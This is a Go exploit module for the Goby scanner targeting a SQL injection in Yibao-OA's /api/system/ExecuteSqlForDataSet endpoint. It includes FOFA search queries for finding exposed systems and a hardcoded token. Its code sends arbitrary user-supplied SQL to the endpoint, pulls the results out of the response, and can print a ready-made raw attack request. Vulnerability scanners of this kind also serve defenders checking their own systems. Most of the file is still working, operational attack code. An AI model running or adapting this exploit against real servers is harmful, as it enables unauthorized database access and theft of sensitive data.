package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yibao-OA /api/system/ExecuteSqlForDataSet SQL Injection Vulnerability",
    "Description": "<p>Yibao-OA is committed to helping enterprises discover and attract excellent talents, while also providing employment and career development opportunities for individuals. Their service covers various industries and fields, including technology, finance, sales, marketing, etc. Langxin stalent uses a variety of modern talent recruitment tools and methods to help enterprises and individuals achieve their recruitment and employment goals.</p><p>Yibao-OA /api/system/ExecuteSqlForDataSet has a SQL injection vulnerability through which attackers can obtain sensitive information, which can even lead to the server being taken over.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2024-05-09",
    "PostTime": "2024-05-30",
    "Author": "Town",
    "FofaQuery": "title=\"欢迎登录易宝OA系统\" && body=\"/Content/css/OAstyle.css\"",
    "GobyQuery": "title=\"欢迎登录易宝OA系统\" && body=\"/Content/css/OAstyle.css\"",
    "Level": "3",
    "Impact": "<p>Yibao-OA /api/system/ExecuteSqlForDataSet has a SQL injection vulnerability through which attackers can obtain sensitive information, which can even lead to the server being taken over.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability:http://www.its365.net/products.aspx/</p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "SELECT @@VERSION;",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|'([^']*)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "易宝OA /api/system/ExecuteSqlForDataSet SQL 注入漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝OA是一款非常强大的手机办公软件，这里不仅为广大的用户提供了一个更好的工作日历，而且每个人都可以在这里进行重要事项的记录，同时软件中还拥有更好的打卡系统，让用户可以快速记录自己的工作时常，而且调班与补卡也会更加的简单，让你工作活跃度得到提升。</p><p>易宝OA /api/system/ExecuteSqlForDataSet 存在SQL注入漏洞，攻击者可以通过该漏洞获取敏感信息，严重甚至可以导致服务器被接管。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a><a href=\"https://www.longshine.com/\"></a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>易宝OA /api/system/ExecuteSqlForDataSet 存在SQL注入漏洞，攻击者可以通过该漏洞获取敏感信息，严重甚至可以导致服务器被接管。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yibao-OA /api/system/ExecuteSqlForDataSet SQL Injection Vulnerability",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>Yibao-OA is committed to helping enterprises discover and attract excellent talents, while also providing employment and career development opportunities for individuals. Their service covers various industries and fields, including technology, finance, sales, marketing, etc. Langxin stalent uses a variety of modern talent recruitment tools and methods to help enterprises and individuals achieve their recruitment and employment goals.</p><p>Yibao-OA /api/system/ExecuteSqlForDataSet has a SQL injection vulnerability through which attackers can obtain sensitive information, which can even lead to the server being taken over.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability:<span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><a href=\"http://www.its365.net/products.aspx/\">http://www.its365.net/products.aspx/</a></span></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Yibao-OA /api/system/ExecuteSqlForDataSet has a SQL injection vulnerability through which attackers can obtain sensitive information, which can even lead to the server being taken over.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10959"
}`

	sendPayloadiwtmaxqp := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/api/system/ExecuteSqlForDataSet`
		payloadConfig := httpclient.NewPostRequestConfig(uri)
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadConfig.Data = "token=zxh&sql=" + sql + "&strParameters"

		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "\"is_succeed\":true") {
			return nil, errors.New("SELECT Fail")
		}
		return resp, err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloadiwtmaxqp
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT USER`
			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/api/system/ExecuteSqlForDataSet`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloadiwtmaxqp
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, `"Column1":"([^"]*)"`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /api/system/ExecuteSqlForDataSet HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Connection: close

token=zxh&sql=` + sql + `;&strParameters`
			}
			return expResult
		},
	))
}
